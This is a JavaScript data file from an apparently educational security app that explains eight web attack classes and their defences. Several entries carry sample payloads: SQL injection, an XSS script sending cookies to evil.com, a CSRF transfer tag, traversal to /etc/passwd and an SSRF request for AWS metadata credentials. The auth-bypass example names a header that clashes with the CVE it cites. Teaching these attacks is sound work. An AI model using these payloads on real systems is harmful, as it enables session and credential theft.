// src/data/attackKnowledge.js
// Educational content shown in the AttackExplainer panel section

export const ATTACK_KNOWLEDGE = {
  "SQL Injection": {
    icon: "💉",
    tagline: "Poisoning the database conversation",
    what: "SQL Injection occurs when attacker-controlled input is interpreted as SQL code rather than data. The database executes malicious commands because it can't distinguish them from legitimate queries.",
    how: "An attacker inputs ' OR 1=1-- into a login field. If unsanitized, the query becomes SELECT * FROM users WHERE id='' OR 1=1--', returning all rows.",
    impact: "Full database read/write access, authentication bypass, data exfiltration, and in some configurations, OS command execution.",
    defend: "Parameterized queries (prepared statements) are the primary defense. Input validation and least-privilege DB accounts add depth.",
    realWorld: "The 2012 LinkedIn breach: 6.5M passwords stolen via SQL injection on an unsanitized endpoint.",
    difficulty: 3,
    prevalence: 5,
    cvssRange: "6.5 – 10.0"
  },
  "XSS": {
    icon: "📡",
    tagline: "Hijacking the browser's trust",
    what: "Cross-Site Scripting injects malicious scripts into content other users see. The browser executes them with full trust because they appear to come from a legitimate site.",
    how: "An attacker posts <script>document.location='https://evil.com?c='+document.cookie</script> in a comment field. Every visitor's cookies are sent to the attacker.",
    impact: "Session hijacking, credential theft, DOM manipulation, keylogging, drive-by malware delivery.",
    defend: "Content Security Policy headers, output encoding (never insert raw user data into HTML), and HttpOnly/Secure cookie flags.",
    realWorld: "The 2005 MySpace Samy worm: a single XSS payload spread to 1 million profiles in 20 hours.",
    difficulty: 2,
    prevalence: 5,
    cvssRange: "4.3 – 8.8"
  },
  "CSRF": {
    icon: "🪤",
    tagline: "Tricking users into acting against themselves",
    what: "Cross-Site Request Forgery forces authenticated users to unknowingly submit requests. The server sees a valid session and executes the action without knowing it was coerced.",
    how: "An attacker embeds <img src='https://bank.com/transfer?to=attacker&amount=5000'> in an email. When a logged-in user opens it, the browser fires the request with their cookies.",
    impact: "Unauthorized transactions, account modifications, privilege escalation through admin actions.",
    defend: "CSRF tokens (unique per session, verified server-side), SameSite cookie attribute, and Origin header checking.",
    realWorld: "A 2008 router vulnerability allowed CSRF attacks to change DNS settings on millions of home routers.",
    difficulty: 3,
    prevalence: 3,
    cvssRange: "4.3 – 8.8"
  },
  "Path Traversal": {
    icon: "🗂️",
    tagline: "Climbing the directory tree uninvited",
    what: "Path traversal (directory traversal) exploits insufficient input validation on file paths. Attackers use sequences like ../../ to escape intended directories and access arbitrary files.",
    how: "An API endpoint /api/file?name=report.pdf becomes /api/file?name=../../etc/passwd — the server reads and returns the system password file.",
    impact: "Source code disclosure, credentials exposure, configuration file leaks, and combined with write access: webshell placement.",
    defend: "Canonicalize paths before use, validate against an allowlist of permitted directories, never pass raw user input to file system APIs.",
    realWorld: "CVE-2021-41773: Apache HTTP Server 2.4.49 path traversal led to RCE on thousands of servers within hours of disclosure.",
    difficulty: 2,
    prevalence: 3,
    cvssRange: "5.3 – 9.8"
  },
  "RCE": {
    icon: "💥",
    tagline: "Full control. Game over.",
    what: "Remote Code Execution is the most severe class of vulnerability — an attacker runs arbitrary code on the target server. The entire system is compromised.",
    how: "A deserialization vulnerability in a Java application allows an attacker to craft a malicious serialized object. When deserialized, it spawns a reverse shell.",
    impact: "Complete system compromise, lateral movement through internal networks, ransomware deployment, data destruction.",
    defend: "Keep all dependencies updated. Disable deserialization of untrusted data. Use WAFs, sandboxing, and network egress filtering.",
    realWorld: "Log4Shell (CVE-2021-44228): a single log statement could trigger RCE in any Java app using Log4j2. Affected 3 billion+ devices.",
    difficulty: 5,
    prevalence: 2,
    cvssRange: "9.0 – 10.0"
  },
  "SSRF": {
    icon: "🔭",
    tagline: "Making the server your reconnaissance proxy",
    what: "Server-Side Request Forgery tricks a server into making HTTP requests on behalf of an attacker — to internal services, cloud metadata endpoints, or other external systems.",
    how: "An image proxy endpoint fetches any URL. An attacker passes http://169.254.169.254/latest/meta-data/iam/security-credentials/. The server fetches AWS credentials and returns them.",
    impact: "Cloud credential theft, internal service enumeration, firewall bypass, access to non-internet-facing databases and APIs.",
    defend: "Allowlist valid URL destinations, block RFC-1918 private ranges and link-local addresses, disable unnecessary URL-fetching features.",
    realWorld: "The 2019 Capital One breach: SSRF against an EC2 metadata endpoint exposed 100M+ customer records.",
    difficulty: 3,
    prevalence: 3,
    cvssRange: "5.0 – 9.8"
  },
  "Auth Bypass": {
    icon: "🔓",
    tagline: "Skipping the lock entirely",
    what: "Authentication bypass vulnerabilities allow attackers to access protected resources without valid credentials — exploiting flawed session management, middleware gaps, or logic errors.",
    how: "A crafted HTTP header (X-Middleware-Skip: 1) causes Next.js to skip its authentication middleware entirely. Protected routes become publicly accessible.",
    impact: "Unauthorized admin access, data breach, account takeover, privilege escalation.",
    defend: "Defense-in-depth: never rely on a single auth check. Verify authentication at both middleware and handler level. Audit framework-specific bypass CVEs.",
    realWorld: "CVE-2025-29927: Next.js middleware bypass via x-middleware-subrequest header exposed thousands of production applications.",
    difficulty: 3,
    prevalence: 3,
    cvssRange: "7.5 – 9.8"
  },
  "Supply Chain": {
    icon: "📦",
    tagline: "Poisoning the well upstream",
    what: "Supply chain attacks compromise software before it reaches the end user — infecting build tools, package registries, CI systems, or open-source dependencies.",
    how: "An attacker publishes a malicious package named 'colrs' (typosquatting 'colors'). Developers npm install colrs by mistake, importing a cryptominer into their app.",
    impact: "Massive blast radius — one compromised package can affect millions of downstream applications simultaneously.",
    defend: "Pin exact dependency versions (lockfiles), use Software Composition Analysis (SCA) tools, audit new dependencies before adding, use Subresource Integrity on CDN assets.",
    realWorld: "SolarWinds 2020: malicious code injected into an Orion update was distributed to 18,000 organizations including US government agencies.",
    difficulty: 5,
    prevalence: 2,
    cvssRange: "7.0 – 10.0"
  }
};

export const getAttackKnowledge = (vector) => {
  return ATTACK_KNOWLEDGE[vector] || {
    icon: "⚠️",
    tagline: "Unknown attack class",
    what: "This attack vector doesn't have a detailed knowledge entry yet.",
    how: "No mechanism details available.",
    impact: "Impact unknown — treat as HIGH until classified.",
    defend: "Follow general secure coding practices.",
    realWorld: "No reference available.",
    difficulty: 3,
    prevalence: 3,
    cvssRange: "Unknown"
  };
};
